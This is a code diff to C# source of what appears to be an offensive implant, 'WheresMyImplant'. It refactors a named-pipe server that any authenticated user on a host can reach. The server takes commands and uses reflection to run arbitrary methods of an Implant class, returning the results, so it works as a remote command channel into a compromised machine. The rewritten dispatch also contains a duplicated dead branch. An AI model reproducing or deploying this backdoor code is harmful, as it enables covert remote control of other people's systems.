@@ -11,8 +11,9 @@ using System.IO;
 
 namespace WheresMyImplant
 {
-    class SMBServer
+    class SMBServer : IDisposable
     {
+        private Boolean disposed = false;
         private NamedPipeServerStream namedPipeServerStream;
         private Dictionary<String, Type> mapping = new Dictionary<String, Type>();
 
@@ -28,6 +29,51 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         //
         ////////////////////////////////////////////////////////////////////////////////
+        public void Dispose()
+        {
+            try
+            {
+                Dispose(true); //true: safe to free managed resources
+            }
+            finally
+            {
+                GC.SuppressFinalize(this);
+            }
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
+        protected virtual void Dispose(bool disposing)
+        {
+            if (disposed)
+            {
+                return;
+            }
+
+            if (disposing)
+            {
+                try
+                {
+                    namedPipeServerStream.Flush();
+                    namedPipeServerStream.Close();
+                }
+                catch (IOException error)
+                {
+                    Console.WriteLine("Pipe already closed");
+                }
+                catch (InvalidOperationException error)
+                {
+                    Console.WriteLine("Pipe already closed");
+                }
+            }
+
+            disposed = true;
+        }
+
+        ////////////////////////////////////////////////////////////////////////////////
+        //
+        ////////////////////////////////////////////////////////////////////////////////
         public SMBServer(String pipeName)
         {
             SecurityIdentifier sid = new SecurityIdentifier(WellKnownSidType.AuthenticatedUserSid, null);
@@ -35,35 +81,6 @@ namespace WheresMyImplant
             PipeSecurity pipeSecurity = new PipeSecurity();
             pipeSecurity.AddAccessRule(access);
             namedPipeServerStream = new NamedPipeServerStream(pipeName, PipeDirection.InOut, 100, PipeTransmissionMode.Byte, PipeOptions.None, 0, 0, pipeSecurity);
-        }
-
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        /*
-        public static void StartServer()
-        {
-            Console.WriteLine("Starting SMB Server");
-            while (true)
-            {
-                SMBServer smbServer = new SMBServer();
-                smbServer.waitForConnection();
-                smbServer.mainLoop();
-            }
-        }
-        */
-        ////////////////////////////////////////////////////////////////////////////////
-        //
-        ////////////////////////////////////////////////////////////////////////////////
-        public static void StartServer(String pipeName)
-        {
-            Console.WriteLine("Starting SMB Server");
-            while (true)
-            {
-                SMBServer smbServer = new SMBServer(pipeName);
-                smbServer.waitForConnection();
-                smbServer.mainLoop();
-            }
         }
 
         ////////////////////////////////////////////////////////////////////////////////
@@ -86,64 +103,45 @@ namespace WheresMyImplant
         ////////////////////////////////////////////////////////////////////////////////
         internal void mainLoop()
         {
-            while (true)
+            String[] splitCharacters = new String[]{"\0"};
+            try
             {
-                try
+                String strCommand = Encoding.Unicode.GetString(recieveMessage());
+                String[] arrCommand = strCommand.Split(splitCharacters, StringSplitOptions.RemoveEmptyEntries);
+                if (arrCommand.Length == 0)
                 {
-                    Byte[] command = recieveMessage();
-                    String strCommand = Encoding.Unicode.GetString(command);
-                    Console.WriteLine(Encoding.Unicode.GetString(command));
-                    String[] arrCommand = strCommand.Split('\0');
-                    switch (arrCommand[0].ToLower())
-                    {
-                        case "modules":
-                            advertiseModules();
-                            break;
-                        case "listmodules":
-                            advertiseModules();
-                            break;
-                        case "methods":
-                            advertiseMethods();
-                            break;
-                        case "listmethods":
-                            advertiseMethods();
-                            break;
-                        case "listparameters":
-                            advertiseMethodParameters(arrCommand[1]);
-                            break;
-                        case "usemodule":
-                            //Check if exists
-                            activateModule(arrCommand[1], new Object[] { }, new Object[] { });
-                            break;
-                        case "usemethod":
-                            //Check if exists
-                            activateMethod(arrCommand[1], arrCommand.Skip(1).ToArray());
-                            break;
-                        case "exit":
-                            namedPipeServerStream.Close();
-                            return;
-                        default:
-                            try
-                            {
-                                activateMethod(arrCommand[0], arrCommand.Skip(1).ToArray());
-                            }
-                            catch (Exception error)
-                            {
-                                Console.WriteLine(error);
-                                sendMessage("Invalid Command");
-                            }
-                            break;
-                    }
-                    if (!namedPipeServerStream.IsConnected)
-                    {
-                        namedPipeServerStream.Close();
-                        break;
-                    }
+                    return;
                 }
-                catch (Exception error)
+                String module = arrCommand.First().ToLower();
+                if (module == "modules" || module == "listmodules")
                 {
-                    Console.WriteLine(error);
+                    advertiseModules();
                 }
+                else if (module == "methods" || module == "listmethods")
+                {
+                    advertiseMethods();
+                }
+                else if (module == "parameters" || module == "listparameters")
+                {
+                    advertiseMethodParameters(arrCommand[1]);
+                }
+                else if (module == "parameters" || module == "listparameters")
+                {
+                    advertiseMethodParameters(arrCommand[1]);
+                }
+                else if (module == "usemodule")
+                {
+                    activateModule(arrCommand[1], new Object[] { }, new Object[] { });
+                }
+                else
+                {
+                    activateMethod(arrCommand[0], arrCommand.Skip(1).ToArray());
+                }
+            }
+            catch (Exception error)
+            {
+                Console.WriteLine(error);
+                sendMessage("Invalid Command");
             }
         }
 
@@ -205,7 +203,6 @@ namespace WheresMyImplant
                     sbLoadedMethods.Append(method.ToString() + "\n");
                 }
             }
-            Console.WriteLine(sbLoadedMethods.ToString());
             sendMessage(sbLoadedMethods.ToString());
         }
 
@@ -221,7 +218,6 @@ namespace WheresMyImplant
             {
                 sbParameters.Append(String.Format("{0}|{1}\0", parameter.Position, parameter.Name));
             }
-            Console.WriteLine(sbParameters.ToString());
             sendMessage(sbParameters.ToString());
         }
 
@@ -234,7 +230,6 @@ namespace WheresMyImplant
             Type implantType = typeof(Implant);
             MethodInfo methodInfo = implantType.GetMethod(strMethod);
             String returnValue = (String)methodInfo.Invoke(null, arguments);
-            Console.WriteLine("Output: {0}",  returnValue);
             sendMessage(returnValue);
         }
 
